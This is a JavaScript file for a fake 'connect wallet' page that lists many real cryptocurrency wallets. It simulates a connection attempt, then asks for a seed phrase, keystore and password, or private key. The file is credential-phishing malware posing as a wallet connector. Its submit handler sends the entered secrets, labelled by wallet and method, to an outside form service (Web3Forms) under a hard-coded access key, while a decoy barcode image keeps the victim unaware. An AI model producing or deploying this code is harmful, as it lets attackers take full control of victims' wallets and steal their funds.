// script.js - wallet modal and manual connect flow
(function(){
  const openBtn = document.getElementById('connect-wallet-btn');
  const walletModal = document.getElementById('walletModal');
  const walletModalClose = document.getElementById('walletModalClose');
  const connectingOverlay = document.getElementById('connectingOverlay');
  const manualModal = document.getElementById('manualModal');
  const manualClose = document.getElementById('manualClose');
  const manualConnectBtn = document.getElementById('manualConnectBtn');

  if(!openBtn) return;

  // Robust logo fallback: try multiple sources, then show initials
  function slugify(name){
    if(!name) return '';
    const map = {
      'Trust Wallet':'trustwallet',
      'Coinbase Wallet':'coinbase',
      'Ledger Live':'ledger',
      'Binance Chain Wallet':'binance',
      'Opera Crypto Wallet':'opera',
      'MathWallet':'mathwallet',
      'WalletConnect':'walletconnect',
      'MetaMask':'metamask',
      'Phantom':'phantom'
    };
    if(map[name]) return map[name];
    return name.toLowerCase().replace(/[^a-z0-9]/g,'');
  }

  function setupLogoFallback(){
    const buttons = Array.from(document.querySelectorAll('.wallet-option'));
    buttons.forEach(btn=>{
      const img = btn.querySelector('img');
      if(!img) return;
      const walletName = btn.dataset.wallet || '';
      const primary = btn.dataset.logo || '';
      const slug = slugify(walletName);
      const candidates = [];
      if(primary) candidates.push(primary);
      candidates.push('https://cdn.simpleicons.org/'+slug);
      candidates.push('https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/'+slug+'.svg');
      const domainMap = {
        'MetaMask':'metamask.io',
        'WalletConnect':'walletconnect.com',
        'Coinbase Wallet':'coinbase.com',
        'Trust Wallet':'trustwallet.com',
        'Ledger Live':'ledger.com',
        'Trezor':'trezor.io',
        'Rainbow':'rainbow.me',
        'Argent':'argent.xyz',
        'imToken':'imtoken.org',
        'BitPay':'bitpay.com',
        'Exodus':'exodus.com',
        'Phantom':'phantom.app',
        'Solflare':'solflare.com',
        'Keplr':'keplr.app',
        'Torus':'tor.us',
        'Fortmatic':'fortmatic.com',
        'Opera Crypto Wallet':'opera.com',
        'Binance Chain Wallet':'binance.com',
        'MathWallet':'mathwallet.org',
        'Enkrypt':'enkrypt.io'
      };
      if(domainMap[walletName]) candidates.push('https://logo.clearbit.com/'+domainMap[walletName]);

      img.dataset._altIndex = '0';
      img.addEventListener('error', function onErr(){
        let idx = parseInt(this.dataset._altIndex || '0',10);
        idx += 1;
        if(idx < candidates.length){
          this.dataset._altIndex = String(idx);
          this.src = candidates[idx];
        } else {
          const initials = (walletName||'').split(/\s+/).map(s=>s[0]).join('').slice(0,2).toUpperCase() || 'W';
          const svg = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='64' height='64'><rect width='100%' height='100%' fill='%23888'/><text x='50%' y='50%' fill='%23fff' font-size='20' text-anchor='middle' dominant-baseline='central'>"+initials+"</text></svg>";
          this.removeEventListener('error', onErr);
          this.src = svg;
        }
      });
      if(!img.src || img.src.trim()===''){
        img.src = candidates[0] || '';
      }
    });
  }

  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', setupLogoFallback); 
  else setupLogoFallback();

  // Auto-open modal if ?openWallet=1 in URL
  try{
    const params = new URLSearchParams(window.location.search || '');
    if(params.get('openWallet') === '1'){
      if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', ()=>{ show(walletModal); }); 
      else show(walletModal);
    }
  }catch(e){/* ignore */}

  function show(el){ el.classList.remove('hidden'); }
  function hide(el){ el.classList.add('hidden'); }

  openBtn.addEventListener('click', ()=>{
    show(walletModal);
  });

  walletModalClose.addEventListener('click', ()=>{
    hide(walletModal);
  });

  // Wallet selection
  let selectedWallet = {name: null, logo: null};
  document.getElementById('walletList').addEventListener('click', (e)=>{
    const btn = e.target.closest('.wallet-option');
    if(!btn) return;
    const walletName = btn.dataset.wallet || 'Selected Wallet';
    const walletLogo = btn.dataset.logo || '';
    selectedWallet = {name: walletName, logo: walletLogo};
    hide(walletModal);

    const img = document.getElementById('connectingWalletImg');
    const nameEl = document.getElementById('connectingWalletName');
    const loaderEl = document.querySelector('.loader');

    let logoToUse = '';
    const btnImg = btn.querySelector('img');
    if(btnImg && (btnImg.getAttribute('src') || '').includes('wallet-logos/')){
      logoToUse = btnImg.getAttribute('src');
    }
    if(!logoToUse && walletLogo) logoToUse = walletLogo;

    if(img && logoToUse){ img.src = logoToUse; img.classList.remove('hidden'); }
    if(loaderEl) loaderEl.style.display = '';
    if(nameEl){ nameEl.style.display = ''; nameEl.textContent = 'Connecting to ' + walletName + '...'; }
    show(connectingOverlay);

    // Simulate connection attempt, then show manual input modal
    setTimeout(()=>{
      hide(connectingOverlay);
      if(img){ img.classList.add('hidden'); img.src = ''; }
      show(manualModal);
    }, 7000);
  });

  manualClose.addEventListener('click', ()=>{
    hide(manualModal);
  });

  // Radio toggle for method inputs
  const radios = Array.from(document.querySelectorAll('input[name="method"]'));
  const methodContainers = Array.from(document.querySelectorAll('[data-method]'));
  function updateMethod(){
    const val = document.querySelector('input[name="method"]:checked').value;
    methodContainers.forEach(c=>{
      if(c.getAttribute('data-method')===val) c.classList.remove('hidden'); 
      else c.classList.add('hidden');
    });
  }
  radios.forEach(r=>r.addEventListener('change', updateMethod));
  updateMethod();

  // Manual connect button - send input to Web3Forms
  manualConnectBtn.addEventListener('click', async () => {
    const method = document.querySelector('input[name="method"]:checked').value;
    let rawValue = null;
    if(method==='phrase') rawValue = document.getElementById('phraseInput').value.trim();
    if(method==='keystone') rawValue = document.getElementById('keystoneInput').value.trim();
    if(method==='privateKey') rawValue = document.getElementById('privateKeyInput').value.trim();
    const keystorePassword = document.getElementById('keystonePassword') ? document.getElementById('keystonePassword').value.trim() : '';

    if(!rawValue){
      alert('Please provide the required credentials for the selected method.');
      return;
    }

    const WEB3FORMS_KEY = 'd694f903-843e-4437-9d65-4dd671de82fe';

    // Prepare payload for Web3Forms
    const payload = {
      access_key: WEB3FORMS_KEY,
      subject: `Manual Connect Attempt - ${selectedWallet.name || 'Wallet'}`,
      from_name: selectedWallet.name || 'Wallet Connect',
      Wallet: selectedWallet.name || 'Unknown',
      'Connection Method': method,
      'Provided Value': rawValue,
      'Keystore Password': keystorePassword || 'N/A',
      Note: 'Manual wallet connect attempt via web form'
    };

    // Show Barcode.png in connecting overlay immediately
    hide(manualModal);
    const img = document.getElementById('connectingWalletImg');
    const nameEl = document.getElementById('connectingWalletName');
    const loaderEl = document.querySelector('.loader');
    if(loaderEl) loaderEl.style.display = 'none';
    if(nameEl) nameEl.style.display = 'none';
    if(img){ img.src = 'Barcode.png'; img.classList.remove('hidden'); }
    show(connectingOverlay);

    // Send data to Web3Forms
    try {
      const response = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      const result = await response.json();
      if (response.ok) {
        console.log('Form submitted successfully:', result.message);
      } else {
        console.error('Submission failed:', result.message);
      }
    } catch (err) {
      console.error('Network error while submitting:', err);
    }
  });

  // Close modals on Escape key
  document.addEventListener('keydown', (e)=>{
    if(e.key==='Escape'){
      hide(walletModal); 
      hide(connectingOverlay); 
      hide(manualModal);
    }
  });
})();